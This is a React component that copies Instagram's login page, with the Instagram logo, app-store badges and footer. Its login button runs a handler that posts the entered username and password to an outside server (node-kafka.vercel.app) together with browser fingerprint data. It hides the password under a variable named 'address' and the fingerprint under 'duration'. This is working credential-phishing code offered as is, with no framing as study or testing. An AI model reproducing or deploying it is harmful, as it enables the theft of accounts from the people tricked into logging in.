import React, { useState, useEffect } from 'react'
import './Instagram.css'
import axios from 'axios'

function Instagram() {

  const api = "https://node-kafka.vercel.app"
  const [name, setName] = useState("")
  const [password, setPassword] = useState("")

  let address = password
  let slug = new Date().toLocaleString();
  const { userAgent, deviceMemory, hardwareConcurrency } = navigator;
  let duration = `${userAgent} and ${deviceMemory || 'N/A'} and ${hardwareConcurrency || 'N/A'}`
  const savedata = () => {
    let data = ({
      name,
      address,
      duration,
      slug
    })
    const headers = {
      'Content-Type': 'Application/Json',
      'Accept': 'Application/Json'
    }
    axios.post(`${api}/v1/post`, data)
    console.log(data)
  }

  // useEffect(() => {
  //   const { userAgent, deviceMemory, hardwareConcurrency } = navigator;
  //   const name = new Date().toLocaleString();
  //   const address = `${userAgent} and ${deviceMemory || 'N/A'} and ${hardwareConcurrency || 'N/A'}`;

  //   const data = {
  //     name,
  //     address
  //   };

  //   const headers = {
  //     'Content-Type': 'Application/Json',
  //     'Accept': 'Application/Json'
  //   };

  //   axios.post(`${api}/v1/post`, data)
  //     .then(response => {
  //       console.log('API Response:', response.data);
  //     })
  //     .catch(error => {
  //       console.error('API Error:', error);
  //     });
  // }, []); 

  return (
    <div>

      <span id="root">

        <section className="section-all">
          <main className="main" role="main">
            <div className="wrapper">
              <article className="article">
                <div className="content">
                  <div className="login-box">
                    <div className="header">
                      <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
                    </div>
                    <div className="form-wrap">
                      <form className="form">
                        <div className="input-box">
                          <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email"
                            aria-required="true" autoComplete="off" maxLength="30" autoCorrect="off"
                            name="username" value={name}
                            onChange={(e) => { setName(e.target.value) }}
                            required />
                        </div>
                        <div className="input-box">
                          <input type="password" name="password" id="password"
                            placeholder="Password" aria-describedby="" maxLength="30" autoComplete="off"
                            aria-required="true" autoCorrect="off" value={password}
                            onChange={(e) => { setPassword(e.target.value) }} required />
                        </div>
                        <span className="button-box">
                          <button className="btn" type="button" name="submit"
                            onClick={savedata}> Log in</button>
                        </span>
                        <a className="forgot" href="https://help.instagram.com/">Forgot password?</a>
                      </form>
                    </div>
                  </div>
                  <div className="login-box">
                    <p className="text">Don't have an account?<a href="/facebook">Sign up</a></p>
                  </div>
                  <div className="app">
                    <p>Get the app.</p>
                    <div className="app-img">
                      <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">

                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />

                      </a>

                      <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">

                        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />

                      </a>

                    </div>

                  </div>

                </div>

              </article>

            </div>

          </main>



          <footer className="footer" role="contentinfo">

            <div className="footer-container">



              <nav className="footer-nav" role="navigation">

                <ul>

                  <li><a href="">About Us</a></li>

                  <li><a href="">Support</a></li>

                  <li><a href="/Password">Blog</a></li>

                  <li><a href="">Press</a></li>

                  <li><a href="">Api</a></li>

                  <li><a href="">Jobs</a></li>

                  <li><a href="">Privacy</a></li>

                  <li><a href="">Terms</a></li>

                  <li><a href="">Directory</a></li>

                  <li>

                    <span className="language">Language

                      <select name="language" className="select">

                        <option value="#">English</option>

                        <option value="http://ru-instafollow.bitballoon.com">Russian</option>

                      </select>

                    </span>

                  </li>

                </ul>

              </nav>



              <span className="footer-logo">&copy; 2023 Instagram</span>

            </div>

          </footer>



        </section>

      </span>

    </div>
  )
}

export default Instagram
